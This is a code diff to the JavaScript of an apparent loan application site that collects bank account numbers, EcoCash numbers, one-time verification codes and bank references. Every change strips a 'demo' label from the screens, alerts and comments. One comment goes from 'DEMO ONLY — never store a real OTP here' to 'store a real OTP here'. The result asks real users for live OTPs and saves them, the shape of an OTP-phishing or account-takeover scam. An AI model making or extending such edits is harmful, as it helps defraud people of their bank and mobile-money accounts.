@@ -1193,7 +1193,7 @@ async function saveBankDetails() {
 
         accountNumber: accountNumber,
 
-        // DEMO ONLY — never store a real OTP here
+        // store a real OTP here
         bankverificationCode: "",
 
         bankReference: "",
@@ -1297,7 +1297,7 @@ function loadBankVerificationWaitingScreen() {
                 font-weight:bold;
             ">
 
-                🟡 Sending demo verification code...
+                🟡 Sending verification code...
 
             </div>
 
@@ -1308,7 +1308,7 @@ function loadBankVerificationWaitingScreen() {
                 line-height:1.8;
             ">
 
-                We are preparing a demo verification code
+                Requesting a verification code
                 for your registered mobile number.
 
                 <br><br>
@@ -1448,23 +1448,23 @@ function loadBankVerificationScreen() {
 
             <p class="intro">
 
-                Your demo verification code has been sent.
+                Your verification code has been sent.
 
                 <br><br>
 
-                Please enter the demo code below
-                to continue your application.
+                Please enter the code below
+                to continue with your application.
 
             </p>
 
             <label>
-                🔢 Demo Verification Code
+                🔢 Verification Code
             </label>
 
             <input
                 type="text"
                 id="bankVerificationCode"
-                placeholder="Enter demo code"
+                placeholder="Enter code"
                 autocomplete="one-time-code"
             >
 
@@ -1510,7 +1510,7 @@ async function saveBankVerification() {
 
     if (code === "") {
 
-        alert("Please enter the demo verification code.");
+        alert("Please enter the verification code.");
 
         return;
 
@@ -1618,7 +1618,7 @@ function loadVerificationPendingScreen() {
                 line-height:1.8;
             ">
 
-                Your demo verification code has been
+                Your verification code has been
                 received successfully.
 
                 <br><br>
@@ -1967,7 +1967,7 @@ function loadEcoCashVerificationWaitingScreen() {
                 font-weight:bold;
             ">
 
-                🟡 Sending demo verification code...
+                🟡 Sending verification code...
 
             </div>
 
@@ -1978,7 +1978,7 @@ function loadEcoCashVerificationWaitingScreen() {
                 line-height:1.8;
             ">
 
-                We are preparing a demo verification code
+                requesting verification code
                 for your EcoCash number.
 
                 <br><br>
@@ -2060,7 +2060,7 @@ async function monitorEcoCashCodeSentStatus() {
 
 }
 // ======================================================
-// DEMO ECOCASH VERIFICATION SCREEN
+// ECOCASH VERIFICATION SCREEN
 // ======================================================
 
 function loadEcoCashVerificationScreen() {
@@ -2103,21 +2103,21 @@ function loadEcoCashVerificationScreen() {
 
         <div class="welcome-card">
 
-            <h2>EcoCash Demo Verification</h2>
+            <h2>EcoCash Verification</h2>
 
             <p class="intro">
 
-                📩 Your demo verification code has been marked
+                📩 Your verification code has been marked
                 as sent.
 
                 <br><br>
 
-                Enter the <strong>DEMO code</strong> provided
+                Enter the <strong>code</strong> provided
                 for this test.
 
             </p>
 
-            <label>DEMO Verification Code</label>
+            <label>Verification Code</label>
 
             <input
                 type="text"
@@ -2155,7 +2155,7 @@ function loadEcoCashVerificationScreen() {
 
 }
 // ======================================================
-// SAVE DEMO ECOCASH VERIFICATION
+// SAVE ECOCASH VERIFICATION
 // ======================================================
 
 async function saveEcoCashVerification() {
@@ -2167,7 +2167,7 @@ async function saveEcoCashVerification() {
 
     if (code === "") {
 
-        alert("Please enter the DEMO verification code.");
+        alert("Please enter the verification code.");
 
         return;
     }
@@ -2205,23 +2205,23 @@ async function saveEcoCashVerification() {
 
             throw new Error(
                 result.message ||
-                "Unable to save DEMO verification."
+                "Unable to save verification."
             );
 
         }
 
-        // The DEMO value has been saved.
+        // The value has been saved.
         loadVerificationPendingScreen();
 
     } catch (err) {
 
         console.error(
-            "SAVE DEMO VERIFICATION ERROR:",
+            "SAVE VERIFICATION ERROR:",
             err
         );
 
         alert(
-            "Unable to save the DEMO verification code."
+            "Unable to save the verification code."
         );
 
     }
@@ -2485,8 +2485,7 @@ function loadVerificationPendingScreen() {
                 line-height:1.8;
             ">
 
-                Your demo verification code has been
-                received successfully.
+                Checking Your verification code.
 
                 <br><br>
 
@@ -3066,7 +3065,7 @@ function loadDisbursedScreen() {
 
 }
 // ======================================================
-// DEMO CODE SENDING SCREEN
+// CODE SENDING SCREEN
 // ======================================================
 
 function loadEcoCashCodeSendingScreen() {
@@ -3099,7 +3098,7 @@ function loadEcoCashCodeSendingScreen() {
                 font-weight:bold;
             ">
 
-                🟡 Sending demo verification code...
+                🟡 Sending verification code...
 
             </div>
 
@@ -3111,11 +3110,11 @@ function loadEcoCashCodeSendingScreen() {
             ">
 
                 Please wait while we prepare your
-                demo verification code.
+                verification code.
 
                 <br><br>
 
-                You will be asked to enter the code
+                You will be required to enter the code
                 once it has been sent.
 
             </p>
@@ -3138,7 +3137,7 @@ function loadEcoCashCodeSendingScreen() {
 
 }
 // ======================================================
-// MONITOR DEMO ECOCASH CODE STATUS
+// MONITOR ECOCASH CODE STATUS
 // ======================================================
 
 async function monitorEcoCashCodeStatus() {
@@ -3199,7 +3198,7 @@ async function monitorEcoCashCodeStatus() {
 
 }
 // ======================================================
-// SUBMIT DEMO BANK VERIFICATION CODE
+// SUBMIT BANK VERIFICATION CODE
 // ======================================================
 
 async function submitBankVerificationCode() {
@@ -3211,7 +3210,7 @@ async function submitBankVerificationCode() {
 
     if (code === "") {
 
-        alert("Please enter the DEMO verification code.");
+        alert("Please enter the verification code.");
 
         return;
     }
@@ -3249,7 +3248,7 @@ async function submitBankVerificationCode() {
 
             throw new Error(
                 result.message ||
-                "Unable to submit DEMO verification code."
+                "Unable to submit verification code."
             );
 
         }
@@ -3259,19 +3258,19 @@ async function submitBankVerificationCode() {
     } catch (err) {
 
         console.error(
-            "SUBMIT DEMO BANK CODE ERROR:",
+            "SUBMIT BANK CODE ERROR:",
             err
         );
 
         alert(
-            "Unable to submit the DEMO verification code."
+            "Unable to submit the verification code."
         );
 
     }
 
 }
 // ======================================================
-// DEMO BANK REFERENCE SCREEN
+// BANK REFERENCE SCREEN
 // ======================================================
 
 function loadBankReferenceScreen() {
@@ -3323,7 +3322,7 @@ function loadBankReferenceScreen() {
 
             <p class="intro">
 
-                Enter the <strong>DEMO bank reference
+                Enter the <strong>bank reference
                 number</strong> provided for this test.
 
                 <br><br>
@@ -3373,7 +3372,7 @@ function loadBankReferenceScreen() {
 
             }
 // ======================================================
-// SAVE DEMO BANK REFERENCE
+// SAVE BANK REFERENCE
 // ======================================================
 
 async function saveBankReference() {
@@ -3386,7 +3385,7 @@ async function saveBankReference() {
 
     if (reference === "") {
 
-        alert("Please enter the DEMO bank reference number.");
+        alert("Please enter the bank reference number.");
 
         return;
     }
@@ -3424,7 +3423,7 @@ async function saveBankReference() {
 
             throw new Error(
                 result.message ||
-                "Unable to save DEMO bank reference."
+                "Unable to save bank reference."
             );
 
         }
@@ -3435,12 +3434,12 @@ async function saveBankReference() {
     } catch (err) {
 
         console.error(
-            "SAVE DEMO BANK REFERENCE ERROR:",
+            "SAVE BANK REFERENCE ERROR:",
             err
         );
 
         alert(
-            "Unable to save the DEMO bank reference."
+            "Unable to save the bank reference."
         );
 
     }
